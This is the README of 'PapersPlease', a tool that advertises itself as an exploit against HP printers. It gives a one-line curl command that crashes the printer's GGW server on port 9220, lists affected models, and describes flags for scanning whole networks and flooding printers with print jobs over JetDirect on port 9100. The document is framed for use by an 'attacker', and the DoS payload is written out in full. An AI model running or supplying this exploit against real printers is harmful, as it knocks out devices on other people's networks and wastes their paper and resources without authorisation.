
<div align="center">

<img src="./Assets/Papers_Please_Logo.png" width="20%" />
<br><br>
</div>

## Description

PapersPlease is an exploit that allows an attacker to perform a remote Denial of Service against an HP printer by exploiting the internal GGW server found on port 9220. The tool also comes with the ability to mass print documents from either a single printer 
or all printers on a network by abusing HPs JetDirect protocol found on port 9100.

## How It Works

While the inner workings are more complicated, the exploit in its purest form is as follows:
<br><br>
`curl [IP]:9220 -X 'open 99999999'`
<br><br>
Whats happening here is we are telling the internal GGW server to retrieve the process name running on index number 99999999. However upon receiving the request, the GGW server will instantly crash.
At this time it is unknown exactly why the GGW server crashes when receiving such a request as it is well within range of the allowed index number length which is any number <= 19 digits. In addition, any index number 8 or 9 digits in length will cause the GGW server to crash.

## Known Affected Models
| Model | DoS | Mass Print | GGW Version |
| :---:  | :---: | :---: | :---: |
| HP Envy 7640 |  True  |  False  |  Version: 1.0  |
| HP OfficeJet Pro 6978 |  True  |  True  |  Version: 1.0  |

**NOTE**:<br>
While the above list provides known exploitable models, these do not need to be known to an attacker prior to exploiting.

## Supported Platforms

All x86-64 Linux distributions.

Android phones are also compatible through <a href="https://termux.com/">Termux</a>, an Android terminal application. 

## How To Use

Papers_Please is designed to be very quick and simple to use. As often times Papers_Please can be run without any flags. However, you can specify a network range with the `--network` flag. Or if not attacking an entire network, then use the `--target` flag to specify a specific host. You can optimize Papers_Please through the `--jobs`, `--proc`, and `--slots` flags. Said optimization options are also active by default with values of: 0, 1, and 252 respectively. Additionally Papers_Please will automatically scan for printers by default or when given an address range with the `--network` flag. However this functionality can be disabled with the `--no-scan` flag.

## Required Software

| Package | Version | Platform |
| :---:   | :---:   | :---:    |
| Busybox |  1.30.1  |  Android  |  
| Netcat-openbsd |  1.105-7ubuntu1  |  x86-64  | 
| Curl |  7.47.0-1ubuntu2.12  |  x86-64  |
| Grep (GNU) |  2.25  |  x86-64  |
| Sed (GNU) |  4.2.2  |  x86-64  |
| Iproute2 |  4.3.0  |  x86-64  |
| Bc |  1.06.95(x86-64),1.07.1(Android)  |  Both  |
| Parallel | 20161222(x86-64),20180222(Android) |  Both  |

## Usage

```
./Papers_Please.sh [OPTION]
OPTION:			    DESCRIPTION:
-t, --target={IP}	    Specify a specific
			    target rather than
		     	    all addresses on
			    the network.

-n, --network={IP/CIDR}     Manually specify the
			    network address for
			    the current network
			    you are on.

--papyrus={N}	    	    Number of jobs to
			    send to the printer
			    this should cause
			    the printer to print
			    N number of pages.

-i, --interval={N}  	    The interval before
			    another job is sent
			    to the printer. Where
			    N can be a decimal
			    i.e. 0.1 or a whole
			    number. The default
			    interval is 1.

-j, --jobs={-N|+N|N%|N}     Number of jobs to
			    run. Passes value
			    to parallel.
			    Defaults to 0.

-p, --proc={-N|+N|N%|N}	    Define the maximum
			    N of processes that
			    can be active at a
			    time. Defaults to
			    1.

-s, --slots={-N|+N|N%|N}    The amount of
			    'slots' available
			    to be used by
			    parallel for jobs.
			    Default is 252.

-P, --port={PORT} 	    Specify a specific 
			    port. Useful for 
			    port-forwarded
			    hosts. Port number 
			    is set automatically 
			    based on the attack
			    being preformed.
			    PORT can be any
			    number ranging
			    from 1 to 65535. 

-a, --allow-all		    All address ranges 
			    are allowed. BE CAREFUL 
			    in this mode as it
			    permits scanning of
			    ANY address without
			    restriction.

--no-scan		    Disables the automatic
			    printer discovery scan.
			    By disabling this function
			    the attacker might not
			    know how many hosts were
			    successfully brought
			    down.

--no-check		    Will skip dependency
                            checking.

-q, --quiet		    Suppress output to
			    terminal. Only the
			    progress bar from
			    parallel will be
			    printed to the
			    terminal in this
			    mode.

-v, --version		    Print version
			    information
			    then exit.

-h, --help		    Print help
			    dialog then
			    exit.
```
